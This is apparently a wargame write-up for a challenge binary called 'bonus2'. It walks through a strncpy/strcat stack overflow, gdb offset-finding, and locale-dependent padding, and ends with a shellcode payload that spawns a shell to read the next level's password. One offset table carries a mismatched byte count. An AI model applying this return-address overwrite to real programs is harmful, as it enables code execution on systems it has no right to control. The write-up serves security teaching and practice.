# bonus2

What this program does:

1. Zero buffer (80 bytes)
2. Copy at most 40 characters from the first argument to the beginning of the buffer
3. Copy at most 32 characters from the second argument to the 40th index of the buffer
4. Get the `LANG` environment variable
5. Map it to some integer value into a global variable: `1` if `"fi"`, `2` if `"nl"`, 0 if different or unset
6. Call `greetuser`

`greetuser` does:

1. Declare a buffer (72 bytes)
2. Copy a greetings message, depending on the global language variable
3. For the dutch language, do some weird bitwise magic (more on that later)
4. Append some memory outside of the the current stack frame to the message buffer
5. Print the message buffer to stdout

Three things are interesting:
* Giving a first argument with 40 (or more) characters will not add a NUL byte to the destination buffer
* The program uses `strcat(3)` and `strcpy(3)` on the same buffer without input validation or bounds checking
* `strcat(3)` reads from `[ebp + 8]` which belongs to the previous stack frame

Here's a quick plan.  We need to saturate the first call to `strncpy(3)` so it does not add the NUL byte:

```sh
sat="$(perl -e 'print "A" x 40')"
env -i ~/bonus2 "${sat}" argv2
```

We get:

```
Hello AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAargv2
```

Then, we need to find an offset that will allow us to write to some return address (saved `eip`):

```sh
gdb ~/bonus2
set disassembly-flavor intel
set exec-wrapper env -i
b *greetuser+144
r "$(perl -e 'print "A" x 40')" "$(perl -e 'print "B" x 40')"
x/s $eax
```

This shows:

```
0xbffffd50:      'A' <repeats 40 times>, 'B' <repeats 32 times>
```

So the call to `strcat(3)` in `greetuser` reads from the stack buffer of `main`.  If we continue execution, the program crashes:

```
Cannot access memory at address 0x8004242
```

`0x42` is `'B'` in ASCII, so we can assume this comes from our input.  One problem though is that we only overwrote half of the return address.  Maybe the default message (which is `"Hello "`) is not long enough.

Let's try with another locale, say `"nl"`:

```sh
gdb ~/bonus2
set disassembly-flavor intel
set exec-wrapper env -i LANG=nl
r "$(perl -e 'print "A" x 40')" "$(perl -e 'print "B" x 40')"
```

The program crashes:

```
Cannot access memory at address 0x42424242
```

Great.  Now we should try to calculate how much padding is needed in order to only overwrite saved `eip`.  We know that the message buffer can hold 72 bytes.  We also know that the localized message is copied first, then the buffer from `main` is copied.  Since we chose `LANG="nl"`, the size of the localized message is 13.  We have 40 bytes in `argv[1]`.  This is 53 bytes, so we need 19 more bytes to fill the message buffer.  Right after the end of the buffer should be saved `ebp`, then saved `eip`.  It can be represented as a table, like this:

```
| Input           | Size     | Off | Content |
+-----------------+----------+-----+---------+
| <start>         |  0 bytes | -72 | <empty> |
| "Goedemiddag! " | 13 bytes | -59 | <msg>   |
| <argv[1]>       | 40 bytes | -19 | "A"x40  |
| <argv[2]>       | 19 bytes |   0 | "B"x19  |
| <saved ebp>     |  4 bytes |  +4 | "C"x4   |
| <saved eip>     |  4 bytes |  +8 | "D"x4   |
```

Let's confirm the theory:

```sh
gdb ~/bonus2
set disassembly-flavor intel
set exec-wrapper env -i LANG=nl
# right before ret
b *greetuser+164
r "$(perl -e 'print "A" x 40')" "$(perl -e 'print "B" x 19, "C" x 4, "D" x 4')"
info fr
```

And here is the frame information:

```
Stack level 0, frame at 0xbffffd40:
 eip = 0x8048528 in greetuser; saved eip 0x44444444
 called by frame at 0xbffffd44
 Arglist at 0x43434343, args:
 Locals at 0x43434343, Previous frame's sp is 0xbffffd40
 Saved registers:
  eip at 0xbffffd3c
```

Saved `eip` is `"DDDD"`, and *current* `ebp` (replaced by `leave`, not by `ret`) is `"CCCC"`.  If we continue execution:

```
Program received signal SIGSEGV, Segmentation fault.
Cannot access memory at address 0x44444444
```

Now we need to write a payload that:
* Calls `/bin/sh` in a shell code
* Replaces saved `eip` with the address of the shell code


```sh
sat="$(perl -e 'print "A" x 40')"
env -i LANG=nl "${sat}" "$(cat /tmp/payload-bonus2.bin)"
```

We get a shell!

It's also possible to use `LANG="fi"`.  We simply need to adjust offsets:

```
| Input           | Size     | Off | Content |
+-----------------+----------+-----+---------+
| <start>         |  0 bytes | -72 | <empty> |
| "Hyvää päivää " | 18 bytes | -54 | <msg>   |
| <argv[1]>       | 40 bytes | -14 | "A"x40  |
| <argv[2]>       | 14 bytes |   0 | "B"x19  |
| <saved ebp>     |  4 bytes |  +4 | "C"x4   |
| <saved eip>     |  4 bytes |  +8 | "D"x4   |
```

`argv[2]` needs to hold 14 bytes.

```sh
sat="$(perl -e 'print "A" x 40')"
env -i LANG=fi "${sat}" "$(cat /tmp/payload-bonus2.bin)"
```

We also get a shell.

It can't work with another value for `LANG` because the default message is too short (which is why we overwrote only half of the return address in the beginning).

Anyway, we just need to `cat ~bonus3/.pass` and we're done.
